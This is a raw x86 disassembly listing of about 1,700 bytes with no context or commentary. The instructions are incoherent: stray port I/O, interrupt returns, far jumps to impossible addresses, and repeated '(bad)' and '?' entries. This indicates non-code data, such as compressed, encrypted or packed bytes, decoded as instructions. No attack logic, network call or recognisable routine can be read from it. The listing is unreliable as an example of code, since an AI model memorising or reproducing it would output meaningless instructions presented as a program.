  40676a:	inc    esp
  40676b:	dec    eax
  40676c:	lock push ebx
  40676e:	adc    al,0xe6
  406770:	jg     0x4067ab
  406772:	leave  
  406773:	jne    0x406796
  406775:	fs mov ch,0x93
  406778:	mov    cs,WORD PTR [ebp+0x3]
  40677b:	or     bl,BYTE PTR [ebx+0x4]
  40677e:	push   ebx
  40677f:	push   cs
  406780:	iret   
  406781:	arpl   WORD PTR [esi+0x48],sp
  406784:	push   ecx
  406785:	xchg   ecx,eax
  406786:	bound  edx,QWORD PTR [eax-0x7f]
  406789:	retf   0x90ed
  40678c:	leave  
  40678d:	add    BYTE PTR es:[ecx+0x5503c8b7],ch
  406794:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406795:	and    ah,bl
  406797:	out    0x16,eax
  406799:	cmp    edx,esp
  40679b:	xchg   edi,eax
  40679c:	out    dx,al
  40679d:	dec    esi
  40679e:	dec    edi
  40679f:	sti    
  4067a0:	push   0xd842dda1
  4067a5:	retf   0x22f5
  4067a8:	sbb    eax,ebp
  4067aa:	mov    ds:0x2dbbd4fe,al
  4067af:	xor    eax,DWORD PTR [edi-0x58]
  4067b2:	mov    ecx,0xc1a313da
  4067b7:	cld    
  4067b8:	in     eax,dx
  4067b9:	ror    BYTE PTR [ebp+0x40],0x8f
  4067bd:	fs jbe 0x4067dc
  4067c0:	call   0x4bcedf4d
  4067c5:	out    0xe4,al
  4067c7:	push   es
  4067c8:	retf   
  4067c9:	outs   dx,BYTE PTR ds:[esi]
  4067ca:	stc    
  4067cb:	sbb    ebp,DWORD PTR [ebx-0x2]
  4067ce:	fwait
  4067cf:	adc    esi,esi
  4067d1:	rcr    DWORD PTR [ebx+0x69433148],1
  4067d7:	aad    0x3b
  4067d9:	idiv   al
  4067db:	inc    esi
  4067dc:	sub    DWORD PTR [ecx+0x68],edi
  4067df:	mov    cs,WORD PTR [eax]
  4067e1:	sbb    BYTE PTR [ebx+0x2f4433d3],ah
  4067e7:	dec    ebx
  4067e8:	loope  0x406775
  4067ea:	iret   
  4067eb:	dec    edx
  4067ec:	push   ebx
  4067ed:	arpl   ax,ax
  4067ef:	xchg   edx,eax
  4067f0:	cs mov eax,0xcab888c6
  4067f6:	int    0xf0
  4067f8:	pop    edx
  4067f9:	mov    edi,0xf7778a02
  4067fe:	cmp    al,0x4c
  406800:	pop    eax
  406801:	jns    0x406866
  406803:	popa   
  406804:	sbb    eax,0x1b59ce16
  406809:	pop    ecx
  40680a:	mov    edi,0x528fcb06
  40680f:	sbb    DWORD PTR [edi+ebx*8+0xe8816d7],edx
  406816:	mov    ds:0x5d6b4be0,al
  40681b:	je     0x40687d
  40681d:	sub    DWORD PTR ds:0x2bf8ed2b,0x4c
  406824:	push   ecx
  406825:	out    0xed,al
  406827:	fdivrp st(0),st
  406829:	nop
  40682a:	add    eax,DWORD PTR [eax+0x34]
  40682d:	add    al,0x98
  40682f:	out    0x2,al
  406831:	inc    esp
  406832:	repnz les eax,FWORD PTR [ecx+0xa]
  406836:	loope  0x4067bb
  406838:	scas   eax,DWORD PTR es:[edi]
  406839:	and    DWORD PTR ds:0x4853b0b9,ecx
  40683f:	lock popa 
  406841:	push   ebx
  406842:	sbb    al,0x2d
  406844:	dec    eax
  406845:	cmp    DWORD PTR [esi+0x9],ebx
  406848:	inc    esp
  406849:	addr16 mov al,0x5c
  40684c:	mov    bh,0xa5
  40684e:	int3   
  40684f:	test   al,0x5c
  406851:	pop    edx
  406852:	or     BYTE PTR [edi],ch
  406854:	dec    edx
  406855:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406856:	(bad)  
  406857:	xor    eax,0x62ff53ed
  40685c:	mov    BYTE PTR [ecx-0x178649a6],bh
  406862:	inc    ebx
  406863:	mov    edx,0x8063a289
  406868:	mov    DWORD PTR [esi+0x6e],ecx
  40686b:	pop    ss
  40686c:	mov    edx,edi
  40686e:	neg    BYTE PTR [ebp-0x4a]
  406871:	rol    BYTE PTR [ebx],1
  406873:	sub    ah,bh
  406875:	cmp    eax,0xd5aa0d65
  40687a:	test   esp,eax
  40687c:	mov    al,0x34
  40687e:	jmp    0x1fd78d08
  406883:	sub    ebp,esp
  406885:	adc    esi,DWORD PTR [ecx-0x69ae019f]
  40688b:	sbb    bl,bl
  40688d:	push   edx
  40688e:	lds    ecx,FWORD PTR [esi+0x1e3dc2cd]
  406894:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406895:	jmp    0x404e1ca3
  40689a:	enter  0x8630,0x84
  40689e:	adc    edx,DWORD PTR [ebx+0xf6a0bdc]
  4068a4:	jnp    0x406912
  4068a6:	pusha  
  4068a7:	jp     0x406854
  4068a9:	pop    ds
  4068aa:	mov    al,0xa6
  4068ac:	inc    edx
  4068ad:	xor    BYTE PTR [eax],al
  4068af:	mov    esp,0xbf7f1be7
  4068b5:	xchg   ebp,eax
  4068b6:	dec    ebp
  4068b7:	cmp    al,cl
  4068b9:	int3   
  4068ba:	leave  
  4068bb:	data16 aaa 
  4068bd:	dec    esi
  4068be:	mov    dh,0xf3
  4068c0:	retf   
  4068c1:	sbb    eax,esp
  4068c3:	mov    dh,0xd
  4068c5:	add    al,0x85
  4068c7:	or     DWORD PTR [ecx+0x54],ebx
  4068ca:	dec    eax
  4068cb:	mov    ecx,0xc8908ad0
  4068d0:	out    0xa6,al
  4068d2:	mov    edx,0x6dca9bdd
  4068d7:	inc    ebp
  4068d8:	xchg   al,ch
  4068da:	add    eax,0x30ef4112
  4068df:	push   esi
  4068e0:	repz xchg ebx,eax
  4068e2:	push   bx
  4068e4:	fcom   DWORD PTR [esi+0x4148a543]
  4068ea:	or     dh,BYTE PTR [edi+0x2b]
  4068ed:	add    al,0x1d
  4068ef:	ja     0x40688f
  4068f1:	push   ds
  4068f2:	or     al,0x62
  4068f4:	mov    dl,0x6b
  4068f6:	stc    
  4068f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4068f8:	inc    esp
  4068f9:	mov    cl,dh
  4068fb:	sbb    esi,DWORD PTR [edi]
  4068fd:	sbb    al,0xb4
  4068ff:	jb     0x40692d
  406901:	test   BYTE PTR [eax],bl
  406903:	enter  0xa722,0xd2
  406907:	or     eax,0x13fdbe3b
  40690c:	ret    0x5c93
  40690f:	std    
  406910:	adc    dl,BYTE PTR [esi]
  406912:	and    DWORD PTR [edi+0x48eaf65c],edx
  406918:	sahf   
  406919:	pushf  
  40691a:	ror    BYTE PTR ds:0x20c2e000,0x1e
  406921:	pop    esp
  406922:	push   esp
  406923:	or     cl,bl
  406925:	sub    dl,BYTE PTR ds:0xa85686e4
  40692b:	mov    ebx,0x746b9127
  406930:	add    dl,bh
  406932:	bound  esp,QWORD PTR ds:0xbf30513c
  406938:	cli    
  406939:	dec    eax
  40693a:	pop    ebp
  40693b:	dec    ebp
  40693c:	and    cl,BYTE PTR [edx]
  40693e:	xor    eax,0xbfbfe3e
  406943:	icebp  
  406944:	push   esp
  406945:	jne    0x406978
  406947:	pop    esi
  406948:	mov    ecx,ds
  40694a:	mov    al,ds:0x46353bc7
  40694f:	push   ds
  406950:	or     bh,BYTE PTR [edi+ebp*1+0x4328d6e4]
  406957:	pushf  
  406958:	mov    ah,0x8f
  40695a:	ret    0x8340
  40695d:	jle    0x406958
  40695f:	jp     0x40697d
  406961:	jb     0x406986
  406963:	sbb    ecx,esi
  406965:	sbb    al,0x24
  406967:	add    BYTE PTR ds:0x5f05a15c,0x78
  40696e:	mov    esp,0x6aa1d990
  406973:	mov    dh,bh
  406975:	inc    esp
  406976:	loopne 0x406980
  406978:	pop    es
  406979:	jecxz  0x406935
  40697b:	(bad)  
  40697c:	out    0xe,eax
  40697e:	mov    bh,0xf2
  406980:	pop    ecx
  406981:	xchg   esp,eax
  406982:	leave  
  406983:	test   bh,dh
  406985:	dec    esi
  406986:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406987:	loop   0x406954
  406989:	imul   ecx,DWORD PTR [esi+ecx*1-0x64347fdb],0xd35d204a
  406994:	fmul   st(3),st
  406996:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406997:	loopne 0x4069fd
  406999:	mov    eax,0xad2404a8
  40699e:	das    
  40699f:	jns    0x406a0c
  4069a1:	mov    dh,0xb9
  4069a3:	xor    BYTE PTR [ebp-0x6b],bh
  4069a6:	rcl    BYTE PTR [ecx],cl
  4069a8:	xchg   esi,eax
  4069a9:	push   ebp
  4069aa:	and    ebp,ebp
  4069ac:	sub    ecx,DWORD PTR [edx-0x1962f349]
  4069b2:	outs   dx,DWORD PTR ds:[esi]
  4069b3:	and    dh,BYTE PTR [edi+ecx*1+0x3c]
  4069b7:	(bad)  [edx+0x71]
  4069ba:	inc    ecx
  4069bb:	fiadd  DWORD PTR [ecx]
  4069bd:	outs   dx,BYTE PTR ds:[esi]
  4069be:	iret   
  4069bf:	jle    0x406a1d
  4069c1:	mov    al,0x74
  4069c3:	xor    DWORD PTR [ebp-0x2b],0x67
  4069c7:	gs cmp dl,ch
  4069ca:	jae    0x406a06
  4069cc:	jmp    0x1354a582
  4069d1:	sub    bl,BYTE PTR [bp+si-0x7e87]
  4069d6:	ss jmp 0xb27f:0xc2b603d6
  4069de:	push   eax
  4069df:	(bad)  
  4069e1:	pusha  
  4069e2:	xor    BYTE PTR [esi],dh
  4069e4:	sbb    BYTE PTR [edx+ebx*4],ch
  4069e7:	mov    al,0x22
  4069e9:	cs retf 
  4069eb:	jl     0x406a49
  4069ed:	out    dx,al
  4069ee:	xchg   ebx,eax
  4069ef:	jo     0x4069d2
  4069f1:	lock mov ecx,0x735db67a
  4069f7:	loop   0x4069f4
  4069f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069fa:	push   0x2b
  4069fc:	mov    al,ds:0xe9f1a289
  406a01:	gs xchg edx,eax
  406a03:	cli    
  406a04:	xor    ch,ch
  406a06:	or     eax,0x90df0c58
  406a0b:	or     al,dl
  406a0d:	cmp    ebx,DWORD PTR [ebx-0x64]
  406a10:	and    al,0xe4
  406a12:	mov    WORD PTR [esi-0x7770e9c3],fs
  406a18:	and    eax,0x38727edd
  406a1d:	cwde   
  406a1e:	or     al,0x88
  406a20:	xor    bh,BYTE PTR [ecx+0x54c3fb27]
  406a26:	inc    esp
  406a27:	into   
  406a28:	xchg   BYTE PTR [ecx+0xfaf7f6e],bh
  406a2e:	and    bh,BYTE PTR [ecx+0x4873ac79]
  406a34:	pop    ebx
  406a35:	fs pop ss
  406a37:	ret    
  406a38:	cmp    al,0x66
  406a3a:	(bad)  
  406a3b:	retf   0x80e2
  406a3e:	jmp    0x406a6b
  406a40:	loopne 0x406a08
  406a42:	adc    ch,BYTE PTR [edx]
  406a44:	fistp  QWORD PTR [edi+0x2d]
  406a47:	pop    edx
  406a48:	bound  edx,QWORD PTR cs:[eax]
  406a4b:	lods   al,BYTE PTR ds:[esi]
  406a4c:	jns    0x406a9b
  406a4e:	ins    BYTE PTR es:[edi],dx
  406a4f:	xchg   ecx,eax
  406a50:	mov    cl,0xb7
  406a52:	cmc    
  406a53:	mov    ebp,0x4c897e4
  406a58:	loop   0x4069e8
  406a5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a5b:	mov    edi,DWORD PTR [ebx]
  406a5d:	add    al,0x18
  406a5f:	cld    
  406a60:	imul   esp,DWORD PTR [edx-0x3],0x9bca80b8
  406a67:	mov    dh,0x16
  406a69:	pop    ds
  406a6a:	data16 dec BYTE PTR [esi-0x414e58b8]
  406a71:	sbb    eax,0xffcd958f
  406a76:	sbb    BYTE PTR [esi-0x62],bl
  406a79:	call   0xa9bb3c8d
  406a7e:	pop    ebp
  406a7f:	sub    al,0xbd
  406a81:	jnp    0x406aa3
  406a83:	lea    ebp,[ebx]
  406a85:	sbb    eax,0x754d532f
  406a8a:	leave  
  406a8b:	into   
  406a8c:	inc    BYTE PTR [ebx-0x5d292487]
  406a92:	clc    
  406a93:	popf   
  406a94:	jmp    0x665ad217
  406a99:	into   
  406a9a:	dec    ebp
  406a9b:	aaa    
  406a9c:	test   al,0x6b
  406a9e:	sbb    ch,dh
  406aa0:	outs   dx,BYTE PTR ds:[esi]
  406aa1:	add    eax,0x4a554418
  406aa6:	ins    DWORD PTR es:[edi],dx
  406aa7:	(bad)  
  406aa8:	ja     0x406a8f
  406aaa:	(bad)  
  406aab:	test   BYTE PTR [edi-0x59],ch
  406aae:	ja     0x406ae3
  406ab0:	inc    eax
  406ab1:	and    eax,0xb59a0c3f
  406ab6:	dec    edx
  406ab7:	lock push es
  406ab9:	sti    
  406aba:	(bad)  
  406abb:	sbb    eax,0x89b69b60
  406ac0:	mov    ebp,0xa912ffe5
  406ac5:	dec    ebp
  406ac6:	mov    bh,0x48
  406ac8:	retf   
  406ac9:	gs and eax,0x723caf3f
  406acf:	push   esp
  406ad0:	popf   
  406ad1:	or     BYTE PTR [esi],bl
  406ad3:	mov    ah,0xc9
  406ad5:	pop    esi
  406ad6:	sub    DWORD PTR [eax+0x6f331a5a],edx
  406adc:	(bad)  
  406ade:	sahf   
  406adf:	leave  
  406ae0:	sub    cl,BYTE PTR [edi-0x677ff99c]
  406ae6:	popf   
  406ae7:	aas    
  406ae8:	call   0x27cee510
  406aed:	mov    al,0x5b
  406aef:	(bad)  
  406af0:	adc    esi,DWORD PTR [ecx-0x5c]
  406af3:	aam    0xf2
  406af5:	pop    esp
  406af6:	into   
  406af7:	js     0x406ae8
  406af9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406afa:	cmp    ch,BYTE PTR [edi-0x45]
  406afd:	add    DWORD PTR [ecx-0x6975414b],ecx
  406b03:	mov    dl,0xa2
  406b05:	lods   al,BYTE PTR ds:[esi]
  406b06:	adc    al,0x58
  406b08:	mov    ds:0xf5b79373,al
  406b0d:	jo     0x406b7f
  406b0f:	stc    
  406b10:	mov    ds:0xe043ff19,al
  406b15:	sub    eax,0xfa52e42f
  406b1a:	push   ebp
  406b1b:	pusha  
  406b1c:	pop    edi
  406b1d:	mov    dl,0xf
  406b1f:	jne    0x406b97
  406b21:	adc    eax,0x300d0590
  406b26:	ret    0xb8d1
  406b29:	aad    0xe9
  406b2b:	add    eax,0x455c87ef
  406b30:	lahf   
  406b31:	ds dec esi
  406b33:	int3   
  406b34:	fldcw  WORD PTR [edx-0x1b837700]
  406b3a:	xor    bl,BYTE PTR [ebx+0x4b]
  406b3d:	imul   edx,DWORD PTR [ebp+0x63],0x2b
  406b41:	in     al,dx
  406b42:	rol    edi,1
  406b44:	enter  0x9678,0x42
  406b48:	mov    ch,0x0
  406b4a:	(bad)  
  406b4b:	out    0xfa,eax
  406b4d:	mov    bh,0x3
  406b4f:	pop    es
  406b50:	jo     0x406b39
  406b52:	jnp    0x406bb9
  406b54:	repz and BYTE PTR [esi+0xb29d801],ah
  406b5b:	add    DWORD PTR [ecx-0xe],ecx
  406b5e:	or     ebp,DWORD PTR [edx-0x3ee9d753]
  406b64:	cmp    DWORD PTR [eax+edx*1-0x1d06dd9f],edi
  406b6b:	rol    BYTE PTR [esp+edi*1],1
  406b6e:	adc    esp,esi
  406b70:	push   cs
  406b71:	lods   al,BYTE PTR ds:[esi]
  406b72:	ins    BYTE PTR es:[edi],dx
  406b73:	jg     0x406bee
  406b75:	pop    esi
  406b76:	mov    ch,0x47
  406b78:	sub    esi,edi
  406b7a:	fs (bad) 
  406b7c:	pop    esi
  406b7d:	out    dx,eax
  406b7e:	gs mov ebx,0x5fbb0a12
  406b84:	and    ecx,ebp
  406b86:	jg     0x406bed
  406b88:	mov    WORD PTR [edx-0x64],?
  406b8b:	add    eax,0x2d9c6c09
  406b90:	test   esp,edi
  406b92:	fsub   QWORD PTR [ebx+0x70]
  406b95:	sbb    BYTE PTR [edi-0x1a95f349],0x6b
  406b9c:	out    0x46,eax
  406b9e:	and    esi,DWORD PTR [edi+0x69]
  406ba1:	mov    ?,WORD PTR [eax-0x2ffaeaab]
  406ba7:	dec    ebx
  406ba8:	daa    
  406ba9:	(bad)  
  406baa:	lahf   
  406bab:	in     eax,dx
  406bac:	fidiv  WORD PTR [esi+0xf2c8d59]
  406bb2:	jecxz  0x406b4e
  406bb4:	or     al,BYTE PTR ds:0x40b2fd61
  406bba:	gs es inc edi
  406bbd:	fs into 
  406bbf:	cli    
  406bc0:	sub    DWORD PTR [ebp-0x629b2b72],esi
  406bc6:	cs mov esi,0xa0da3f6d
  406bcc:	jo     0x406bea
  406bce:	jne    0x406be1
  406bd0:	xor    eax,0xd9d8ccfb
  406bd5:	int3   
  406bd6:	lahf   
  406bd7:	ficom  DWORD PTR [ebx]
  406bd9:	mov    ah,0x34
  406bdb:	cld    
  406bdc:	sbb    DWORD PTR [esi-0x717b5fee],0x8b2c75ac
  406be6:	push   ss
  406be7:	fwait
  406be8:	mov    cl,0x36
  406bea:	loopne 0x406c6a
  406bec:	lahf   
  406bed:	xchg   esp,eax
  406bee:	adc    al,BYTE PTR [eax+0x3b]
  406bf1:	fs xor eax,0x6e147427
  406bf7:	inc    ebx
  406bf8:	push   esp
  406bf9:	dec    esi
  406bfa:	outs   dx,DWORD PTR ds:[esi]
  406bfb:	sti    
  406bfc:	mov    ecx,0x47718a19
  406c01:	dec    edx
  406c02:	lock push 0x78bc36f
  406c08:	dec    esp
  406c09:	xchg   edx,eax
  406c0a:	sti    
  406c0b:	dec    esi
  406c0c:	mov    ah,0x80
  406c0e:	sbb    BYTE PTR [edx-0x6b7a1c7f],bl
  406c14:	mov    edi,0xe95c94a7
  406c19:	int    0xe6
  406c1b:	not    eax
  406c1d:	sub    edx,ecx
  406c1f:	pop    DWORD PTR [edx+0x730d152f]
  406c25:	push   esi
  406c26:	push   cs
  406c27:	ja     0x406c1e
  406c29:	cmp    ebx,ebp
  406c2b:	pop    edi
  406c2c:	aaa    
  406c2d:	sbb    DWORD PTR [edx],edi
  406c2f:	dec    esi
  406c30:	sub    ebp,DWORD PTR [eax]
  406c32:	loope  0x406c95
  406c34:	mov    edx,0x2816a770
  406c39:	adc    ebp,DWORD PTR [ebx-0x38]
  406c3c:	jo     0x406c00
  406c3e:	xor    DWORD PTR [esi-0x58],0x5771f55b
  406c45:	dec    ecx
  406c46:	and    al,0x30
  406c48:	ror    DWORD PTR [eax+0x23],0x37
  406c4c:	pop    ebx
  406c4d:	fs enter 0x508c,0x40
  406c52:	inc    ecx
  406c53:	jns    0x406c66
  406c55:	cld    
  406c56:	adc    al,BYTE PTR [edx]
  406c58:	mov    eax,0xca0a757e
  406c5d:	inc    ebx
  406c5e:	call   DWORD PTR [ecx+0xc]
  406c61:	sbb    esp,DWORD PTR [ecx-0x6]
  406c64:	sbb    DWORD PTR [ebx+ebx*8],edx
  406c67:	push   edx
  406c68:	xor    eax,0x69d39eb6
  406c6d:	push   edi
  406c6f:	push   esp
  406c70:	cld    
  406c71:	sub    DWORD PTR [ecx+0x4996debb],0x646e9933
  406c7b:	loopne 0x406cbd
  406c7d:	jle    0x406cb1
  406c7f:	mov    al,0x8
  406c81:	or     cl,BYTE PTR [edx+0x18a5a839]
  406c87:	fdivr  st,st(4)
  406c89:	shr    DWORD PTR [ebp-0x337a2b7d],0x35
  406c90:	mov    ds:0xb85f96d1,al
  406c95:	mov    cl,0x22
  406c97:	adc    al,0xcf
  406c99:	adc    al,0x35
  406c9b:	hlt    
  406c9c:	cld    
  406c9d:	xchg   ecx,eax
  406c9e:	test   eax,0xa6b57bde
  406ca3:	retf   0x8c59
  406ca6:	push   esi
  406ca7:	xchg   esp,eax
  406ca8:	call   0xadb34ce
  406cad:	shl    bh,0xf9
  406cb0:	xor    ah,bh
  406cb2:	inc    ebx
  406cb3:	shl    BYTE PTR [edx+edx*2],cl
  406cb6:	dec    ebp
  406cb7:	cmp    al,0x15
  406cb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cba:	shr    DWORD PTR [ecx+0x197003d9],cl
  406cc0:	out    dx,al
  406cc1:	enter  0xaaa6,0xfd
  406cc5:	and    BYTE PTR ds:0x3895874c,dh
  406ccb:	jne    0x406d10
  406ccd:	mov    ds:0x4d547411,eax
  406cd2:	gs jno 0x406d46
  406cd5:	ret    
  406cd6:	push   edi
  406cd7:	outs   dx,DWORD PTR ds:[esi]
  406cd8:	stos   BYTE PTR es:[edi],al
  406cd9:	mov    eax,ds:0xab79c22
  406cde:	ins    BYTE PTR es:[edi],dx
  406cdf:	lods   al,BYTE PTR ds:[esi]
  406ce0:	adc    esi,DWORD PTR [edi+0x6ce17820]
  406ce6:	jo     0x406d02
  406ce8:	in     al,dx
  406ce9:	retf   0x5544
  406cec:	ret    
  406ced:	popa   
  406cee:	test   BYTE PTR [edx],0x84
  406cf1:	ficom  WORD PTR [eax+0x62]
  406cf4:	js     0x406cb1
  406cf6:	sub    eax,ebx
  406cf8:	mov    bh,0x34
  406cfa:	sbb    esp,ebx
  406cfc:	pop    eax
  406cfd:	fwait
  406cfe:	mov    ds:0xf3c39d96,eax
  406d03:	mov    edi,0x54c086dc
  406d08:	fstp   DWORD PTR [ebx]
  406d0a:	sbb    BYTE PTR [eax],bh
  406d0c:	mov    ebp,0x6b0b99c8
  406d11:	mov    esi,0x7bb6baa
  406d16:	scas   eax,DWORD PTR es:[edi]
  406d17:	test   DWORD PTR [edi-0x38],esp
  406d1a:	arpl   sp,cx
  406d1c:	add    eax,0xc6cb60ef
  406d21:	or     BYTE PTR [ecx-0x1e9c6426],bh
  406d27:	fadd   QWORD PTR [eax-0x546e3de2]
  406d2d:	iret   
  406d2e:	xchg   esi,eax
  406d2f:	pop    eax
  406d30:	lods   eax,DWORD PTR ds:[esi]
  406d31:	cmp    ebx,DWORD PTR [edi+0x667a4609]
  406d37:	test   al,0x17
  406d39:	scas   eax,DWORD PTR es:[edi]
  406d3a:	xor    eax,0x89c5c56f
  406d3f:	mov    ecx,0xc384974c
  406d44:	xchg   ecx,eax
  406d45:	pop    esp
  406d46:	add    BYTE PTR [edi-0x4b9a25b9],bh
  406d4c:	ins    BYTE PTR es:[edi],dx
  406d4d:	ins    DWORD PTR es:[edi],dx
  406d4e:	xchg   edx,eax
  406d4f:	cmp    esp,DWORD PTR [ebx-0x16]
  406d52:	outs   dx,BYTE PTR ds:[esi]
  406d53:	push   0xf6fac127
  406d58:	mov    edx,0x5829e969
  406d5d:	mov    ch,0x90
  406d5f:	inc    ebp
  406d60:	shr    DWORD PTR [esi-0x4d34569f],cl
  406d66:	div    DWORD PTR [edi]
  406d68:	(bad)  
  406d69:	xor    dl,BYTE PTR [ebp+0x24]
  406d6c:	(bad)  ds:0x8774a74e
  406d72:	aam    0xdb
  406d74:	gs dec esp
  406d76:	adc    cl,0x26
  406d79:	pop    ebp
  406d7a:	fwait
  406d7b:	jge    0x406d0e
  406d7d:	(bad)  
  406d7f:	inc    edx
  406d80:	push   esp
  406d81:	adc    al,0xa7
  406d83:	sbb    ah,BYTE PTR [edi-0x35]
  406d86:	shl    DWORD PTR [edx-0xc],1
  406d89:	sbb    bl,bl
  406d8b:	push   ds
  406d8c:	mov    ch,0x92
  406d8e:	pop    esi
  406d8f:	in     al,0x33
  406d91:	add    eax,0x7bc111e2
  406d96:	aad    0x9
  406d98:	mov    bl,0x75
  406d9a:	fcomp  DWORD PTR [ebp+0x112a836d]
  406da0:	sbb    DWORD PTR [eax+0x235ac9da],0xc6406ba6
  406daa:	sbb    DWORD PTR [ebx+0x6a],0xc6238d41
  406db1:	fadd   QWORD PTR [edx]
  406db3:	mov    esi,0x4c112f47
  406db8:	nop
  406db9:	cmp    al,BYTE PTR [esi-0x80]
  406dbc:	xlat   BYTE PTR ds:[ebx]
  406dbd:	jmp    0x406d97
  406dbf:	dec    DWORD PTR [ebx]
  406dc1:	cld    
  406dc2:	and    BYTE PTR [edi+0x483aebd2],cl
  406dc8:	sub    ch,dl
  406dca:	xchg   esp,eax
  406dcb:	aam    0xdb
  406dcd:	or     esi,DWORD PTR [ebp-0x39]
  406dd0:	xor    al,0xfb
  406dd2:	into   
  406dd3:	sub    DWORD PTR [esi+0x50],0xec9b6b6e
  406dda:	mov    ebx,0x1c6c16ed
  406ddf:	jbe    0x406d73
  406de1:	pop    esi
  406de2:	outs   dx,BYTE PTR ds:[esi]
  406de3:	xor    edi,DWORD PTR [ebx]
  406de5:	ret    
  406de6:	js     0x406dd6
  406de8:	sbb    al,0x48
  406dea:	int3   
  406deb:	mov    esp,0x3ebf6ec1
  406df0:	mov    gs,WORD PTR [esi-0x65]
  406df3:	jl     0x406e62
  406df5:	(bad)
  406dfa:	mov    ebx,?
  406dfc:	lahf   
  406dfd:	mov    eax,0xfeb8c063
  406e02:	push   es
  406e03:	and    eax,DWORD PTR [ebx]
  406e05:	cdq    
  406e06:	sbb    esp,ebp
  406e08:	inc    edx
  406e09:	retf   
  406e0a:	adc    DWORD PTR [esi+0x47],ebx
  406e0d:	sbb    BYTE PTR [edx-0x3a],cl
  406e10:	dec    esp
  406e11:	call   0x6247:0x764aebe7
  406e18:	int    0x83
  406e1a:	div    BYTE PTR [edx]
  406e1c:	adc    bl,BYTE PTR [edx]
  406e1e:	fcmove st,st(2)
  406e20:	enter  0xf4c5,0x3f
  406e24:	jbe    0x406e04
  406e26:	cli    
  406e27:	aaa    
  406e28:	inc    esi
  406e29:	adc    eax,0x8a0c6210
  406e2e:	retf   
  406e2f:	(bad)  
  406e30:	retf   
  406e31:	ja     0x406e70
  406e33:	mov    ch,0xaf
  406e35:	and    DWORD PTR [esi],ecx
  406e37:	mov    bl,bl
  406e39:	dec    esi
  406e3a:	or     DWORD PTR [esi-0x7307a1c0],esi
  406e40:	loopne 0x406de2
  406e42:	inc    esp
  406e43:	add    cl,bl
  406e45:	push   cs
  406e46:	push   ecx
  406e47:	out    0xd3,eax
  406e49:	arpl   dx,sp
  406e4b:	outs   dx,BYTE PTR ds:[esi]
  406e4c:	adc    eax,0x5d8fa854
  406e51:	repnz mov dh,0xc9
  406e54:	sub    ebp,eax
  406e56:	jbe    0x406e82
  406e58:	xor    al,0x35
  406e5a:	scas   al,BYTE PTR es:[edi]
  406e5b:	inc    esp
  406e5c:	mov    ebp,0xfa9b636d
  406e61:	inc    esi
  406e62:	stos   DWORD PTR es:[edi],eax
  406e63:	enter  0x67f6,0x32
  406e67:	bound  esi,QWORD PTR [ecx+0x49fc83f6]
  406e6d:	or     BYTE PTR [edx-0x45],ah
  406e70:	mov    dl,0xd2
  406e72:	pushf  
  406e73:	mov    esi,0x90ff68f8
  406e78:	dec    esp
  406e79:	js     0x406e05
  406e7b:	mov    cl,0x3a
  406e7d:	xchg   edx,eax
  406e7e:	sbb    eax,0x232fbc9b
  406e83:	fsub   QWORD PTR [edx]
  406e85:	add    al,cl
  406e87:	imul   ecx,DWORD PTR [edi-0x6],0xf134624
  406e8e:	rol    DWORD PTR [esi-0x23],cl
  406e91:	xchg   esi,eax
  406e92:	mov    dl,0x86
  406e94:	(bad)  
  406e95:	sbb    eax,0x9eff8927
  406e9a:	jle    0x406eeb
  406e9c:	cld    
  406e9d:	jne    0x406ea7
  406e9f:	cmp    al,0x4e
  406ea1:	jle    0x406ebe
  406ea3:	retf   
  406ea4:	inc    ecx
  406ea5:	pop    ebx
  406ea6:	daa    
  406ea7:	lds    eax,FWORD PTR [edx+0x6b]
  406eaa:	xchg   BYTE PTR [edx],bl
  406eac:	jmp    0x406f26
  406eae:	lods   al,BYTE PTR ds:[esi]
  406eaf:	xchg   ebp,eax
  406eb0:	mov    eax,0x9bd36b68
  406eb5:	retf   
  406eb6:	inc    esi
  406eb7:	add    al,0xd3
  406eb9:	push   0x51
  406ebb:	(bad)
  406ebe:	cmp    ebx,edi
  406ec0:	ins    BYTE PTR es:[edi],dx
  406ec1:	mov    dl,0x77
  406ec3:	jmp    0xeb47:0xb890dc0e
  406eca:	popa   
  406ecb:	stos   BYTE PTR es:[edi],al
  406ecc:	inc    ebp
  406ecd:	push   0x28562dae
  406ed2:	je     0x406f34
  406ed4:	and    esp,DWORD PTR [ebp-0x247206ee]
  406eda:	std    
  406edb:	pushf  
  406edc:	pop    edx
  406edd:	push   ds
  406ede:	and    DWORD PTR [ecx-0x18632d5f],ecx
  406ee4:	(bad)  
  406ee5:	mov    ebx,eax
  406ee7:	mov    ebx,0xf77bd64c
  406eec:	stos   DWORD PTR es:[edi],eax
  406eed:	clc    
  406eee:	dec    ecx
  406eef:	sbb    DWORD PTR [ecx],edi
  406ef1:	(bad)  
  406ef2:	and    al,0x9b
  406ef4:	imul   ebx,DWORD PTR [edx],0xb8205d41
  406efa:	arpl   sp,bx
  406efc:	repnz das 
  406efe:	pop    eax
  406eff:	imul   eax,DWORD PTR [ebx],0xe1a93f3c
  406f05:	push   esp
  406f06:	pop    esi
  406f07:	sbb    eax,0x302a17a2
  406f0c:	sbb    ch,BYTE PTR [edx]
  406f0e:	push   0xffffff95
  406f10:	mov    esp,DWORD PTR [ebp+0x62]
  406f13:	shr    DWORD PTR [esi+0x2e],cl
  406f16:	dec    ebp
  406f17:	das    
  406f18:	add    DWORD PTR [ebp+0x4f],ecx
  406f1b:	es inc ebx
  406f1d:	fwait
  406f1e:	inc    esp
  406f1f:	jnp    0x406ec9
  406f21:	push   edx
  406f22:	dec    BYTE PTR [edi]
  406f24:	bound  edx,QWORD PTR [ebx-0x29]
  406f27:	add    al,0xba
  406f29:	imul   eax,DWORD PTR [ebx+0x62],0xd8fcf0f3
  406f30:	inc    edi
  406f31:	test   eax,0xdf759fb7
  406f36:	lahf   
  406f37:	arpl   WORD PTR [edi-0x20],sp
  406f3a:	ins    BYTE PTR es:[edi],dx
  406f3b:	inc    edi
  406f3c:	pop    es
  406f3d:	icebp  
  406f3e:	push   0xffffff81
